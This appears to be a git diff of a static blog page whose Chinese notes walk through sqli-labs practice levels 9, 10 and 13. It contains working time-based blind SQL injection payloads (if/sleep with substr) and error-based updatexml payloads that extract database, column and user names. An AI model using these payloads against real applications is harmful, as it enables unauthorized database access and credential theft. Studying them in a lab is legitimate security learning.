@@ -14,7 +14,7 @@
 <meta property="og:description" content="在通关sqllabs第9关与第10关时我们知道了时间盲注这一概念，用时间盲注来判断注入点是否正确，使用sleep延迟函数。if()函数				条件判断函数if(a,b,c)	   if判断句，a为条件，b、c为执行语句；如果a为真就执行b，a为假就执行c;sleep()函数			网页延迟n秒后，输出结果left（）函数             从左边数，取几个数例如：left（abcdef，3）">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2023-04-14T16:00:00.000Z">
-<meta property="article:modified_time" content="2023-04-16T11:20:01.939Z">
+<meta property="article:modified_time" content="2023-04-16T11:25:36.035Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
   
@@ -103,8 +103,7 @@
 <li>爆字段：?id&#x3D;1’ and If(ascii(substr((select column_name from information_schema.columns where table_name&#x3D;’users’ and table_schema&#x3D;database() limit 0,1),1,1))&#x3D;105,sleep(4),1)–+</li>
 <li>爆数据：?id&#x3D;1’ and If( (substr((select username from users limit 0,1),1,1))&#x3D;’a’,sleep(4),1)–+</li>
 </ol>
-<hr>
-<h2 id="title-报错注入date-2023-04-15tags"><a href="#title-报错注入date-2023-04-15tags" class="headerlink" title="title: 报错注入date: 2023-04-15tags:"></a>title: 报错注入<br>date: 2023-04-15<br>tags:</h2><p>在sqllabs 第13关中，可以测试出闭合点，但没有回显位，无法重复11，12题中的操作，所以这里我们尝试使用报错注入<br>1’)  and updatexml(1,concat(0x7e,(database()),0x7e),1) #<br>&lt;虽然报错，但我们知道了库名为security&gt;<br>1’)  and updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_schema&#x3D;’security’ and table_name&#x3D;’users’),0x7e),1) #<br>&lt;再求得表名&gt;<br>1’)  and updatexml(1,concat(0x7e,(select group_concat(username)from users),0x7e),1) #<br>&lt;再求得字段&gt;<br>可求得username 和 password</p>
+<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>在sqllabs 第13关中，可以测试出闭合点，但没有回显位，无法重复11，12题中的操作，所以这里我们尝试使用报错注入<br>1’)  and updatexml(1,concat(0x7e,(database()),0x7e),1) #<br><strong>虽然报错，但我们知道了库名为security</strong><br>1’)  and updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_schema&#x3D;’security’ and table_name&#x3D;’users’),0x7e),1) #<br><strong>再求得表名</strong><br>1’)  and updatexml(1,concat(0x7e,(select group_concat(username)from users),0x7e),1) #<br><strong>再求得字段</strong><br>可求得username 和 password</p>
 
       
     </div>
